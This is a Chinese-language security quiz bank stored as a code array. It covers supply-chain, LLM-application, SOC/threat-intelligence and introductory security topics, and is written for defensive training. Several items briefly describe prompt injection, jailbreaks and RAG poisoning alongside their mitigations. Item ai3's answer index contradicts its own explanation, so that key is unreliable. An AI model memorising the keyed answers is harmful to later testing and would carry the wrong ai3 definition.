  { id:"sc8", cat:"supply", level:"中级", q:"把 SCA 接入 CI 时较稳妥的策略是？", options:["先对新增依赖做阻断门禁，存量按 SLA 专项清理","一次性阻断所有历史漏洞","只在发布前手工扫一次","只在本地开发机扫描"], answer:0, explain:"避免因存量债导致流水线瘫痪，同时保证新引入不再恶化。" },
  { id:"sc9", cat:"supply", level:"中级", q:"典型的依赖投毒手法不包括？", options:["给依赖包增加单元测试","抢注废弃包名","仿冒相似包名（typosquatting）","在安装脚本中执行恶意代码"], answer:0, explain:"增加单元测试是正常开发行为；其余三项都是投毒常见手法。" },
  { id:"sc10", cat:"supply", level:"中级", q:"降低依赖投毒风险的有效措施是？", options:["使用私有命名空间与内部代理，禁用或审核安装脚本","只使用下载量最高的包","关闭所有依赖更新","只写自己的代码不用开源"], answer:0, explain:"来源管控 + 脚本管控能显著降低被投毒的概率与影响。" },
  { id:"sc11", cat:"supply", level:"高级", q:"构建链安全中最需要限制的是？", options:["构建机的权限（尤其是发布与签名凭证）","构建机的 CPU 型号","构建机的网络带宽","构建机的机箱颜色"], answer:0, explain:"构建机一旦可被 PR 操纵又能拿到发布凭证，就能产出带后门的正式版本。" },
  { id:"sc12", cat:"supply", level:"高级", q:"可复现构建（Reproducible Build）的价值是？", options:["相同源码与依赖能产出相同哈希，可验证产物未被动手脚","构建速度更快","安装包更小","支持更多系统"], answer:0, explain:"可复现构建让「产物是否被篡改」可被独立验证，是供应链可信的关键能力。" },
  { id:"sc13", cat:"supply", level:"高级", q:"制品签名的正确用法是？", options:["发布时签名，部署或使用时强制验证签名","只签名不验证","把私钥放在构建脚本里","签名后允许随意替换制品"], answer:0, explain:"签名与验证必须成对存在；不验证的签名只提供心理安慰。" },
  { id:"sc14", cat:"supply", level:"高级", q:"密钥less 签名（如基于 OIDC 的短期证书）的优势是？", options:["无需长期保管静态私钥，降低密钥泄露风险","签名速度更快","不需要网络","可以无限期有效"], answer:0, explain:"短期证书由身份平台签发并记录，避免长期私钥成为高价值目标。" },
  { id:"sc15", cat:"supply", level:"中级", q:"CI/CD 流水线中「表达式注入」的典型成因是？", options:["把外部输入（issue 标题、PR 描述）直接拼进脚本执行","使用 YAML 语法","使用缓存","并行执行任务"], answer:0, explain:"外部输入参与脚本拼接会导致命令注入；应作为环境变量传递并避免拼接。" },
  { id:"sc16", cat:"supply", level:"中级", q:"PR 触发的流水线不应具备的权限是？", options:["读取生产发布/签名凭证","读取仓库源码","运行单元测试","上传测试报告"], answer:0, explain:"PR 来自外部贡献者时风险最高；发布凭证必须与 PR 构建隔离。" },
  { id:"sc17", cat:"supply", level:"初级", q:"发现密钥已提交到 Git 仓库，正确处置顺序是？", options:["先轮换/作废密钥，再清理历史与副本，然后查审计日志","先删文件再慢慢换密钥","只删文件即可","把仓库设为私有即可"], answer:0, explain:"密钥一旦提交即视为泄露，必须优先轮换；仅删除文件无法阻止历史与 fork 中的读取。" },
  { id:"sc18", cat:"supply", level:"初级", q:"防止密钥进入代码库的有效手段是？", options:["提交前与 CI 中做密钥扫描，并把密钥改为密钥库注入","禁止使用数据库密码","要求开发者手动检查","只在生产环境扫描"], answer:0, explain:"pre-commit + CI 扫描形成双重拦截，密钥库注入消除硬编码。" },
  { id:"sc19", cat:"supply", level:"中级", q:"开源组件引入评审中，最需要法务关注的是？", options:["许可证类型（如 GPL 的传染性）与产品分发方式的兼容性","代码行数","Star 数量","文档语言"], answer:0, explain:"许可证不合规可能导致产品被迫开源或面临法律风险，需在引入前评估。" },
  { id:"sc20", cat:"supply", level:"中级", q:"对停止维护的开源组件的合理处理是？", options:["评估替代方案或做隔离与补偿控制，并指定接手责任人","继续用不做任何处理","立即删除所有相关功能","只加注释说明"], answer:0, explain:"无维护意味着漏洞不会被修；要么替换，要么用隔离与监控降低风险并明确责任人。" },
  { id:"sc21", cat:"supply", level:"初级", q:"供应商合同中最应明确的与安全相关的条款是？", options:["数据范围与用途限定、事件通报时限、审计权与退出销毁","付款周期","品牌露出","会议频率"], answer:0, explain:"合同是约束供应商安全行为的主要手段，需覆盖数据、通报、审计与退出。" },
  { id:"sc22", cat:"supply", level:"初级", q:"对接触高敏数据的供应商，管理力度应？", options:["更严格：准入评估、定期复核、必要时现场检查","与其他供应商相同","可以放宽以节省成本","只要求口头承诺"], answer:0, explain:"按数据等级分级管理供应商是通行做法，高敏场景需更强约束。" },
  { id:"sc23", cat:"supply", level:"入门", q:"SolarWinds 事件暴露的核心问题是？", options:["软件更新通道被植入后门，下游客户大规模受影响","机房消防不合格","员工口令太短","备份未加密"], answer:0, explain:"该事件说明更新与分发通道是供应链的高价值攻击点，需要签名与来源验证。" },
  { id:"sc24", cat:"supply", level:"入门", q:"Log4Shell 事件给我们的主要启示是？", options:["广泛使用的组件漏洞会瞬间波及海量系统，需要 SBOM 与快速影响面判定","应避免使用任何开源","应关闭日志功能","应禁用 Java"], answer:0, explain:"问题不在开源本身，而在于缺乏依赖台账与响应机制导致无法快速判定与修复。" },
  { id:"sc25", cat:"supply", level:"高级", q:"供应链事件响应的首要能力是？", options:["在短时间内判定「哪些制品与在线实例受影响」","先对外发布公告","先起诉供应商","先重装所有服务器"], answer:0, explain:"影响面判定决定止血与沟通节奏；这依赖 SBOM、制品台账与资产清单的日常建设。" },
  { id:"sc26", cat:"supply", level:"高级", q:"检验供应链响应能力的有效方式是？", options:["定期演练：模拟某依赖 0day，测量从情报到判定的耗时","只做文档评审","只在年底总结","等真实事件发生"], answer:0, explain:"演练是唯一能暴露判定链路断点的办法；文档与流程未经演练往往不可用。" },

  // ---- AI·LLM 安全 / 威胁情报与 SOC（v1.5.1 第四批）----
  { id:"ai1", cat:"aisec", level:"入门", q:"LLM 应用与普通 Web 应用相比，最本质的新风险来自？", options:["指令与数据走在同一条通道，模型无法严格区分","网络传输不加密","用户界面更复杂","数据库性能不足"], answer:0, explain:"系统提示、用户输入与外部内容对模型都是「文本指令」，缺少像参数化查询那样的强制隔离机制。" },
  { id:"ai2", cat:"aisec", level:"入门", q:"评估 LLM 应用时，第一条主线应该是？", options:["画出数据流：输入 → 检索 → 模型 → 工具 → 输出","先看模型的参数量","先看 UI 配色","先看部署机器配置"], answer:0, explain:"沿数据流逐段找「可被操纵」与「有副作用」的点，是 LLM 安全评估的基本方法。" },
  { id:"ai3", cat:"aisec", level:"初级", q:"间接提示注入（Indirect Prompt Injection）指？", options:["恶意指令藏在模型会读取的外部内容里（网页/文档/邮件）","用户直接在对话框里骂模型","模型自身出现幻觉","提示词过长被截断"], answer:1, explain:"间接注入把攻击载荷放进被检索或解析的内容，是 LLM 应用最实际、最危险的攻击面。" },
  { id:"ai4", cat:"aisec", level:"初级", q:"防御提示注入最有效的方向是？", options:["把不可信内容降权为纯数据，并收敛工具权限与副作用","写更严厉的系统提示词","禁止用户上传文件","把模型换成更大的"], answer:0, explain:"提示词层面的加固可被绕过，结构隔离与权限最小化才可靠；高风险动作还需人工确认。" },
  { id:"ai5", cat:"aisec", level:"中级", q:"多租户 LLM 应用中，最关键的隔离检查是？", options:["检索是否强制按租户/用户过滤，且过滤条件不由模型决定","是否使用向量数据库","是否使用流式输出","是否做了结果缓存"], answer:0, explain:"检索层若缺少强制过滤，A 用户可检索到 B 用户私有文档，形成跨租户数据泄露。" },
  { id:"ai6", cat:"aisec", level:"中级", q:"越狱（Jailbreak）防护的现实目标是？", options:["提高绕过成本并限制后果，而非彻底消除","完全杜绝任何违规输出","禁止用户提问","把温度参数设为 0"], answer:0, explain:"越狱无法根除；有效做法是输入检测 + 输出过滤 + 高风险动作确认与审计，并把拦截率作为指标。" },
  { id:"ai7", cat:"aisec", level:"中级", q:"RAG 知识库投毒的风险在于？", options:["恶意内容进入知识库后被检索进上下文，牵引模型输出","向量检索速度下降","知识库占用磁盘","检索结果排序变慢"], answer:0, explain:"知识库对模型是「可信感很强」的信息源，入库审核与权限控制是必要防线。" },
  { id:"ai8", cat:"aisec", level:"中级", q:"RAG 回答的引用可追溯性为什么重要？", options:["能核对原文以判断回答依据是否被污染或篡改","可以提升回答速度","可以减少 token 消耗","可以美化界面"], answer:0, explain:"引用溯源让用户能验证答案依据，是抵御知识库投毒与幻觉的重要手段。" },
  { id:"ai9", cat:"aisec", level:"高级", q:"Agent 工具调用最大的风险来源是？", options:["模型决定调用什么、参数是什么，而工具可能有副作用与过大权限","工具接口写得不够优雅","调用日志太多","工具返回 JSON 格式"], answer:0, explain:"Agent 的风险集中在「有副作用的动作 + 过大的权限 + 缺少确认」，需按副作用分级管控。" },
  { id:"ai10", cat:"aisec", level:"高级", q:"对「发邮件」这类外发型工具，合理控制是？", options:["收件人白名单 + 人工确认 + 全量审计","允许任意收件人以提升效率","只在日志里记录","由模型自行判断是否安全"], answer:0, explain:"外发动作不可撤回，必须用白名单与确认限制影响面，并保留审计证据。" },
  { id:"ai11", cat:"aisec", level:"初级", q:"把模型输出直接插入页面 HTML 会导致？", options:["XSS：模型输出内容被当作代码执行","页面加载变慢","字体渲染异常","SEO 排名下降"], answer:0, explain:"模型输出属于不可信内容，必须按用户输入处理：转义、白名单净化或结构化校验。" },
  { id:"ai12", cat:"aisec", level:"初级", q:"处理模型输出的正确姿势是？", options:["当不可信输入处理：编码、参数化、结构校验","直接 eval 执行","直接拼进 SQL","直接写入 shell 脚本"], answer:0, explain:"任何「执行」路径都必须经过显式白名单与结构校验，避免二次漏洞。" },
  { id:"ai13", cat:"aisec", level:"高级", q:"从公共仓库下载模型权重前，最应做的动作是？", options:["校验来源与哈希/签名，优先使用仅数据格式避免反序列化执行","先跑一遍看效果","改个文件名更安全","放到生产目录再验证"], answer:0, explain:"权重文件可能被投毒，pickle 类格式甚至可直接执行代码；校验与安全格式是基本要求。" },
  { id:"ai14", cat:"aisec", level:"高级", q:"推理环境的加固建议是？", options:["禁出网、最小挂载、非特权用户运行","以 root 运行方便调试","开放全部网络权限","挂载宿主机全部目录"], answer:0, explain:"推理环境一旦被利用，会成为跳板；隔离与最小权限能限制影响范围。" },
  { id:"ai15", cat:"aisec", level:"初级", q:"把真实客户数据直接贴进外部模型对话，主要风险是？", options:["等同于向第三方提供个人信息，可能违反合规要求","会消耗更多 token","回答质量下降","模型会记住并公开"], answer:0, explain:"提示词往往夹带业务数据，需按数据等级评估可用模型、脱敏或改用私有部署。" },
  { id:"ai16", cat:"aisec", level:"初级", q:"下列哪项属于「提示词数据自查」应覆盖的内容？", options:["是否含个人信息、密钥、内部地址等敏感数据","提示词的字数是否整齐","是否使用了 emoji","段落缩进是否规范"], answer:0, explain:"上线前要审查发送内容的数据等级，并确认供应商的留存与训练条款。" },
  { id:"ai17", cat:"aisec", level:"中级", q:"四层护栏通常指？", options:["输入过滤、能力收敛、输出校验、流程确认","加密、备份、审计、监控","防火墙、WAF、IDS、EDR","开发、测试、预发、生产"], answer:0, explain:"输入/能力/输出/流程四层叠加，其中「能力收敛 + 流程确认」对限制后果最有效。" },
  { id:"ai18", cat:"aisec", level:"中级", q:"护栏效果应该怎么衡量？", options:["用红队样本集统计拦截率与漏拦率并做回归","统计代码行数","统计拦截次数越多越好","看部署了几个组件"], answer:0, explain:"护栏必须可度量、可回归，否则无法判断改进是否有效，也容易误拦正常业务。" },
  { id:"ai19", cat:"aisec", level:"高级", q:"LLM 应用红队评估的产出应包含？", options:["最小复现步骤、实际结果、影响判定与修复位置","仅一份风险清单","仅截图","仅评分"], answer:0, explain:"可复现的证据链才能推动工程修复，并沉淀为回归用例。" },
  { id:"ai20", cat:"aisec", level:"高级", q:"为什么要把红队样本集沉淀为回归资产？", options:["改提示词或换模型版本后需要重新验证是否回归","可以提升模型效果","可以减少服务器成本","可以用来训练模型"], answer:0, explain:"提示词与模型频繁变更，只有回归资产能保证防护不会悄悄退化。" },
  { id:"ai21", cat:"aisec", level:"中级", q:"LLM 应用的成本型 DoS 通常表现为？", options:["超长输入或循环调用导致账单飙升与服务不可用","磁盘写满","CPU 温度过高","网络丢包"], answer:0, explain:"入口限长限频、工具循环设上限、预算熔断是必要控制。" },
  { id:"ai22", cat:"aisec", level:"中级", q:"限制 Agent 无限循环的常见做法是？", options:["设置工具调用轮次上限并对相同调用去重","提高温度参数","增大上下文长度","更换模型"], answer:0, explain:"轮次上限 + 去重能避免 Agent 陷入递归调用，造成成本与副作用失控。" },
  { id:"ai23", cat:"aisec", level:"入门", q:"AI 治理中，「提示词与工具配置」应如何管理？", options:["纳入版本管理，变更需评审与留痕","由个人保存在本地文档","随改随用无需记录","只记录最终版本"], answer:0, explain:"提示词与工具权限等价于生产配置，必须版本化、可评审、可回滚。" },
  { id:"ai24", cat:"aisec", level:"入门", q:"AI 应用上线变更留痕至少应记录？", options:["变更内容、提交与评审人、回归结果、生效时间与回滚方式","服务器型号","开发者电脑品牌","代码行数"], answer:0, explain:"留痕是为了事后可追溯与快速回滚，是治理的基本要求。" },
  { id:"ai25", cat:"aisec", level:"高级", q:"把 LLM 应用纳入企业安全体系的关键是？", options:["接入既有日志、SIEM、应急与变更管理，而非独立小系统","单独采购一个 AI 安全产品即可","只做内部自查","只在出事时上报"], answer:0, explain:"AI 应用的风险最终要在统一的安全运营与治理框架里闭环。" },
  { id:"ai26", cat:"aisec", level:"高级", q:"评估 LLM 应用时，「影响面优先」的含义是？", options:["先收紧有副作用的动作（确认+审计+限额），再优化提示与检测","先优化提示词再考虑权限","先做性能优化","先做界面体验"], answer:0, explain:"副作用动作是唯一不可逆的风险，先限制它能让整体风险迅速可控。" },
  { id:"ct1", cat:"soccti", level:"入门", q:"威胁情报的分层中，给管理层看的是？", options:["战略情报（趋势与风险）","战术情报（IOC 列表）","原始日志","漏洞扫描报告"], answer:0, explain:"战略情报服务决策与资源投入；战术情报给检测设备，运营情报给日常安全运营。" },
  { id:"ct2", cat:"soccti", level:"入门", q:"威胁情报「没人用」的最常见原因是？", options:["层级与消费方错配，或缺少可执行落地","情报数量太少","情报格式太新","情报太贵"], answer:0, explain:"先明确谁用它做什么决策，再决定收集什么，否则收藏即终点。" },
  { id:"ct3", cat:"soccti", level:"初级", q:"IOC 与 TTP 相比，主要短板是？", options:["易过期且易被规避（换域名/哈希即可）","无法自动化匹配","不能写进规则","只能用于邮件"], answer:0, explain:"IOC 见效快但时效短；TTP 与行为规则更难被绕过，价值更持久。" },
  { id:"ct4", cat:"soccti", level:"初级", q:"IOC 落地前必须评估？", options:["误伤风险（共享 IP、CDN、云服务）与有效期","文件大小","颜色编码","订阅价格"], answer:0, explain:"不做误伤评估直接封禁，容易造成业务中断；同时要管理失效与下架。" },
  { id:"ct5", cat:"soccti", level:"初级", q:"SOC 一线值班最需要的支持是？", options:["清晰的告警分级、剧本与升级路径","更多仪表盘","更快的机器","更多告警来源"], answer:0, explain:"流程与剧本决定处置效率；告警越多而流程不清只会加剧积压。" },
  { id:"ct6", cat:"soccti", level:"初级", q:"值班交接中必须包含的内容是？", options:["未闭环告警状态与临时抑制规则及其到期时间","个人作息安排","设备采购计划","年度预算"], answer:0, explain:"未闭环事项与临时抑制最容易在交接中丢失，导致漏处理或长期误抑制。" },
  { id:"ct7", cat:"soccti", level:"中级", q:"检测规则上线前的必要动作是？", options:["用历史数据回归：确认该报的报、不该报的不报","直接上线观察","仅评审语法","仅统计规则条数"], answer:0, explain:"未回归的规则上线即噪音；回归数据是规则质量的基本保障。" },
  { id:"ct8", cat:"soccti", level:"中级", q:"衡量检测覆盖度时，容易出现的偏差是？", options:["只看「有没有规则」，忽视是否真能检出变种","统计规则行数太少","使用 ATT&CK 编号","按日志源分类"], answer:0, explain:"规则存在不等于有效；需用真实样本与演练结果验证覆盖是否真实。" },
  { id:"ct9", cat:"soccti", level:"中级", q:"告警研判的四个核心问题不包括？", options:["告警的颜色是否醒目","资产是否关键","行为是否已知良性","是否有成功迹象"], answer:0, explain:"研判关注资产重要性、行为性质与证据，与视觉呈现无关。" },
  { id:"ct10", cat:"soccti", level:"中级", q:"降低误报最有效的前置动作是？", options:["与变更系统、扫描器、备份等已知行为联动做白名单","直接关闭噪音规则","提高阈值到不再报警","只保留高危规则"], answer:0, explain:"多数误报来自已知的合法行为；把变更与工具行为纳入上下文可显著降噪。" },
  { id:"ct11", cat:"soccti", level:"高级", q:"威胁狩猎的起点通常是？", options:["基于 ATT&CK 或情报提出假设，再去找能验证的数据","等告警触发","随机浏览日志","购买新设备"], answer:0, explain:"狩猎是假设驱动的主动搜索；数据缺口本身就是重要结论。" },
  { id:"ct12", cat:"soccti", level:"高级", q:"狩猎没有发现任何异常，应该怎么处理？", options:["记录结论与数据缺口，补齐日志与检测项","认为白做了没有价值","停止后续狩猎","删除相关查询"], answer:0, explain:"「未发现」也是结论，常暴露日志缺失；补数据能提升后续检测与狩猎能力。" },
  { id:"ct13", cat:"soccti", level:"中级", q:"应急响应六阶段的正确顺序是？", options:["准备 → 识别 → 遏制 → 根除 → 恢复 → 复盘","识别 → 恢复 → 遏制 → 复盘 → 根除 → 准备","遏制 → 识别 → 复盘 → 根除 → 恢复 → 准备","准备 → 遏制 → 识别 → 根除 → 复盘 → 恢复"], answer:0, explain:"先识别再遏制，根除后恢复，最后复盘沉淀；顺序错乱会导致证据丢失或攻击反复。" },
  { id:"ct14", cat:"soccti", level:"中级", q:"应急中的「遏制」需要平衡的两件事是？", options:["快速止血与保留证据（内存与日志）","成本与性能","界面与体验","人员排班与休假"], answer:0, explain:"直接关机或重装会毁掉证据；正确做法是网络隔离并先做内存/日志固定。" },
  { id:"ct15", cat:"soccti", level:"高级", q:"取证工作中「证据完整性」的核心要求是？", options:["先固定再做分析，并记录取证链与哈希","尽快分析尽快结案","只保留结论","在原始系统上直接操作"], answer:0, explain:"证据必须可追溯、可复现，否则结论无法采信，也可能被反取证手段破坏。" },
  { id:"ct16", cat:"soccti", level:"高级", q:"面对日志被清理的情况，可行的验证思路是？", options:["多源交叉（EDR/流量/认证/云审计）与集中化日志留存","相信单一日志结论","直接结案","只问当事人"], answer:0, explain:"单源被破坏时需靠多源交叉；集中化与只追加存储能显著提高抗销毁能力。" },
  { id:"ct17", cat:"soccti", level:"初级", q:"ATT&CK 最有价值的用法是？", options:["对齐检测覆盖、情报与复盘语言，找出检测缺口","替代防火墙","自动处置告警","生成漏洞报告"], answer:0, explain:"ATT&CK 是共同语言：用技术编号串联情报、规则、演练与复盘。" },
  { id:"ct18", cat:"soccti", level:"初级", q:"ATT&CK 覆盖矩阵中，优先补齐的组合是？", options:["有日志但无规则、以及关键技术无日志","已有规则的技术再多写几条","把编号抄全","美化图表"], answer:0, explain:"优先补「差一点就能检出」和「根本没数据」的缺口，收益最大。" },
  { id:"ct19", cat:"soccti", level:"中级", q:"情报订阅源管理最关键的两个维度是？", options:["可信度与可执行性（能否落到规则或处置）","价格与界面","数量与格式","更新频率与体积"], answer:0, explain:"来源可信度决定是否可依赖，可执行性决定能否产生价值；其余为次要维度。" },
  { id:"ct20", cat:"soccti", level:"中级", q:"情报富化（Enrichment）的典型用途是？", options:["在告警里自动补上资产、情报与历史行为，帮助快速研判","提升告警数量","减少日志存储","加快扫描速度"], answer:0, explain:"富化让一线在最短时间拿到决策所需上下文，是 SOC 提效的关键动作。" },
  { id:"ct21", cat:"soccti", level:"中级", q:"下列哪个指标最容易被误用？", options:["关闭告警的数量（关闭多不代表防得好）","MTTD","MTTR","告警准确率"], answer:0, explain:"关闭数量可通过盲目关闭刷高，属于典型的「有害指标」；应关注准确率与漏检复盘。" },
  { id:"ct22", cat:"soccti", level:"中级", q:"漏检事件（该报未报）发生后最重要的动作是？", options:["转化为新规则或补日志，并纳入回归验证","追究值班人员责任即可","删除相关数据","更换 SIEM 产品"], answer:0, explain:"漏检的价值在于补齐检测能力；仅追责不改进会让同类事件重复发生。" },
  { id:"ct23", cat:"soccti", level:"高级", q:"归因结论的正确使用方式是？", options:["标注置信度与依据，并明确它对防御决策的影响","作为唯一行动依据","对外公开确定结论","据此直接反击"], answer:0, explain:"归因是低置信推断，存在假旗与工具外流导致的误判；应服务于加固与监控决策。" },
  { id:"ct24", cat:"soccti", level:"高级", q:"归因中需要警惕的干扰因素是？", options:["对手故意留下的假线索（假旗）与工具买卖导致的特征重叠","情报订阅过多","日志格式不统一","人员轮班"], answer:0, explain:"基础设施与工具会被共享或出售，单靠特征重叠容易误判。" },
  { id:"ct25", cat:"soccti", level:"入门", q:"建设检测能力最先要解决的问题是？", options:["关键日志有没有采集、是否完整、保留多久","先买最贵的 SIEM","先招更多人","先做可视化大屏"], answer:0, explain:"没有日志就没有检测与溯源；日志覆盖与保留期决定能力上限。" },
  { id:"ct26", cat:"soccti", level:"入门", q:"下列最应优先接入的日志源是？", options:["认证/域控与边界设备、关键服务器","打印机耗材状态","会议室预定系统","员工餐厅消费记录"], answer:0, explain:"优先接高价值安全事件源，能最快形成有效检测能力。" },

  // ---- 入门档补充（v1.5.1 第五批）----
  { id:"wb1", cat:"web", level:"入门", q:"浏览器向服务器发一次请求，响应里用哪个头告诉浏览器要设置会话 Cookie？", options:["Set-Cookie","Content-Type","User-Agent","Referer"], answer:0, explain:"Set-Cookie 用于下发 Cookie；HttpOnly/Secure/SameSite 决定它的安全属性。" },
  { id:"wb2", cat:"web", level:"入门", q:"OWASP Top 10 的正确用途是？", options:["作为常见风险检查清单，提示评估方向","替代所有安全测试","证明系统已安全","替代威胁建模"], answer:0, explain:"Top 10 是高频风险的清单，利于沟通与查漏，但不能替代系统性测试与建模。" },
  { id:"bb1", cat:"binary", level:"入门", q:"栈溢出漏洞之所以危险，关键原因是栈上存放着？", options:["函数返回地址，被覆盖可劫持控制流","图片资源","网络配置","日志文件"], answer:0, explain:"覆盖返回地址即可改变程序执行路径；现代系统靠 ASLR/NX/Canary 提高利用难度。" },
  { id:"bb2", cat:"binary", level:"入门", q:"逆向分析时，快速定位关键逻辑的常用起点是？", options:["用 strings 找提示语/错误信息，再查交叉引用","直接读二进制机器码","先跑压力测试","先做网络扫描"], answer:0, explain:"字符串是定位函数的最快线索，配合交叉引用能迅速缩小分析范围。" },
  { id:"cb1", cat:"crypto", level:"入门", q:"TLS 这类实际协议通常如何组合加密算法？", options:["用非对称算法协商会话密钥，再用对称算法加密数据","全程只用非对称加密","全程只用对称加密","不加密，只做签名"], answer:0, explain:"非对称解决密钥分发，对称保证性能，二者配合是主流方案。" },
  { id:"cb2", cat:"crypto", level:"入门", q:"存储用户口令的正确做法是？", options:["使用 bcrypt/argon2 等慢哈希并加盐","MD5 单次哈希","AES 加密后存库","Base64 编码后存库"], answer:0, explain:"慢哈希 + 每用户盐显著提高离线破解成本；可逆加密与编码都不算保护。" },
  { id:"pb1", cat:"pentest", level:"入门", q:"渗透测试开始前最重要的一件事是？", options:["取得书面授权并明确范围与禁止动作","准备好扫描器","找好代理 IP","先跑一遍自动化工具"], answer:0, explain:"没有授权的测试就是攻击；范围、时间窗与禁止动作必须在动手前确认。" },
  { id:"pb2", cat:"pentest", level:"入门", q:"信息收集阶段之所以优先做被动收集，是因为？", options:["不接触目标，降低被发现与封禁风险","被动收集更准确","主动收集违法","被动收集不用授权"], answer:0, explain:"被动收集（公开信息、证书日志）不留痕迹，适合先摸清资产范围。" },
  { id:"nb1", cat:"network", level:"入门", q:"VLAN 在网络中的作用是？", options:["做网络隔离，限制广播域与横向访问","提高带宽","加密流量","替代防火墙"], answer:0, explain:"VLAN 用于分区管理；划分不当会让内网横向移动变得更容易。" },
  { id:"nb2", cat:"network", level:"入门", q:"用 Wireshark 判断某协议是否明文传输，最直接的方法是？", options:["跟随 TCP 流查看内容，看是否可读","看包的数量","看端口号是否常见","看抓包文件大小"], answer:0, explain:"Follow TCP/HTTP Stream 能直接看到载荷内容，明文则账号口令可见。" },
  { id:"cl1", cat:"cloud", level:"入门", q:"云上「对象存储」的典型安全风险是？", options:["存储桶被配置为公开可读写","磁盘容量不足","网络延迟升高","镜像构建变慢"], answer:0, explain:"公开桶是云上最常见的数据泄露原因之一，需做配置巡检。" },
  { id:"cl2", cat:"cloud", level:"入门", q:"云账号保护的第一优先级动作是？", options:["主/根账号开启 MFA 且不日常使用","先买更多实例","先建更多子账号","先开启 CDN"], answer:0, explain:"主账号权限最大，一旦失守影响全局；MFA + 不日常使用是底线要求。" },
  { id:"bl1", cat:"blue", level:"入门", q:"蓝队工作的核心目标是？", options:["缩短发现与响应时间，并持续改进检测能力","比红队更早拿到旗标","采购更多安全设备","减少安全预算"], answer:0, explain:"蓝队价值体现在 MTTD/MTTR 与检测覆盖的持续提升，而非设备数量。" },
  { id:"bl2", cat:"blue", level:"入门", q:"分析登录日志时，判断暴力破解最关键的线索是？", options:["同一来源多次失败后出现成功登录","登录时间在白天","用户使用了浏览器","请求来自内网"], answer:0, explain:"失败堆积后成功意味着可能已猜中口令，需立即核查与处置。" },
  { id:"mb1", cat:"mobile", level:"入门", q:"Android APK 中声明权限与对外组件的位置是？", options:["AndroidManifest.xml","build.gradle","strings.xml","图标资源目录"], answer:0, explain:"配置清单是移动安全评估的第一站：权限与 exported 组件都在这里声明。" },
  { id:"mb2", cat:"mobile", level:"入门", q:"判断 App 是否过度收集信息，最直接的依据是？", options:["申请的权限与实际功能是否匹配","App 的安装包大小","App 的更新频率","App 的评分高低"], answer:0, explain:"权限与功能不匹配是过度收集的典型信号，还要结合隐私政策与实际行为核查。" },
  { id:"db1", cat:"datasec", level:"入门", q:"下列属于「敏感个人信息」的是？", options:["人脸信息与医疗记录","公司公开宣传册","产品说明书","开源许可证文本"], answer:0, explain:"生物特征、医疗、金融、行踪等一旦泄露危害更大，属敏感个人信息，需更强保护。" },
  { id:"db2", cat:"datasec", level:"入门", q:"现实中数据泄露最常见的成因是？", options:["配置错误与权限过大，而非被高级攻击者攻破","黑客技术太强","硬件故障","备份太多"], answer:0, explain:"公开桶、无口令共享链接、离职未收权限这类「自己放出去」的情况占多数。" },
  { id:"sb1", cat:"supply", level:"入门", q:"软件供应链安全要回答的第一个问题是？", options:["我的系统由哪些组件与版本构成","我的服务器性能如何","我的界面是否美观","我的代码行数多少"], answer:0, explain:"先有组成清单（SBOM/依赖清单），才谈得上漏洞响应与影响判定。" },
  { id:"sb2", cat:"supply", level:"入门", q:"在开源组件引入环节，较稳妥的做法是？", options:["通过内部代理仓库引入、锁定版本并对新增依赖评审","直接连公网仓库随意安装","只用下载量最高的包","禁止使用任何开源"], answer:0, explain:"来源可控 + 版本锁定 + 引入评审，能把风险挡在门口。" },
  { id:"ab1", cat:"aisec", level:"入门", q:"大模型「幻觉」指的是？", options:["生成了听起来合理但并不正确的内容","模型运行变慢","提示词被截断","网络连接失败"], answer:0, explain:"模型按概率生成文本，事实性内容必须核实，关键判定应放在外部校验。" },
  { id:"ab2", cat:"aisec", level:"入门", q:"使用 AI 工具时，最基本的安全习惯是？", options:["不贴敏感数据、核实关键结论、限制其操作权限","尽量多贴数据以提升效果","完全信任输出","让它自动执行所有操作"], answer:0, explain:"数据最小化、结果核实、权限收敛是 AI 使用的三条基本纪律。" },
  { id:"sb3", cat:"soccti", level:"入门", q:"安全团队中「检测工程」主要负责？", options:["把日志与情报转成可用的检测规则并维护质量","采购设备","写合规报告","管理门禁"], answer:0, explain:"检测工程负责规则编写、回归与覆盖度管理，是发现能力的核心岗位。" },
  { id:"sb4", cat:"soccti", level:"入门", q:"收到告警后，判断是否需要升级的关键组合是？", options:["高权限账号 + 核心资产 + 有成功迹象","告警颜色 + 时间 + 来源端口","告警数量 + 设备型号 + 部门","处理人 + 值班表 + 天气"], answer:0, explain:"三者叠加意味着潜在影响最大，应优先升级处置。" },
  { id:"wb3", cat:"web", level:"入门", q:"Cookie 的 HttpOnly 属性主要作用是？", options:["禁止 JavaScript 读取该 Cookie，降低 XSS 窃取会话的风险","加密 Cookie 内容","让 Cookie 永不过期","限制 Cookie 体积"], answer:0, explain:"HttpOnly 让脚本读不到会话 Cookie，是 XSS 的纵深防御手段之一。" },
  { id:"wb4", cat:"web", level:"入门", q:"判断一个 Web 功能是否存在越权，最直接的做法是？", options:["替换参数中的 id/编号，看能否访问他人数据","观察页面配色","测量响应时间","检查是否有验证码"], answer:0, explain:"这类以对象编号直接引用资源的功能是越权高发区，需验证服务端是否校验数据归属。" },
  { id:"bb3", cat:"binary", level:"入门", q:"NX（栈不可执行）保护的目的是？", options:["阻止在栈上执行注入的代码，迫使攻击者转向 ROP 等手段","加密二进制文件","压缩程序体积","加快启动速度"], answer:0, explain:"NX 提高利用门槛但不等同安全，需与其他缓解机制组合使用。" },
  { id:"bb4", cat:"binary", level:"入门", q:"快速查看二进制文件中的可读字符串，常用命令是？", options:["strings","top","ping","df"], answer:0, explain:"strings 是最快的摸底手段，常能直接暴露提示语、路径与内嵌地址。" },
  { id:"cb3", cat:"crypto", level:"入门", q:"对称加密使用 ECB 模式的核心问题是？", options:["相同明文块生成相同密文块，泄露数据结构","速度太慢","密钥太长","无法处理中文"], answer:0, explain:"ECB 缺乏随机化，经典例子是加密后的图片仍能看出轮廓；应改用带 IV 的模式或 AEAD。" },
  { id:"cb4", cat:"crypto", level:"入门", q:"「哈希不是加密」的正确含义是？", options:["哈希是单向的，无法通过哈希还原原文","哈希比加密更安全","哈希需要密钥","哈希可以被解密"], answer:0, explain:"正因单向，它适合做完整性校验与口令存储，但不适合需要还原原文的场景。" },
  { id:"pb3", cat:"pentest", level:"入门", q:"一份渗透测试报告中，最有价值的部分通常是？", options:["可复现的复现步骤与可落地的修复建议","测试人员数量","工具截图的多少","测试耗时长度"], answer:0, explain:"报告的价值在于让开发能复现并修复，而不是证明测试做过。" },
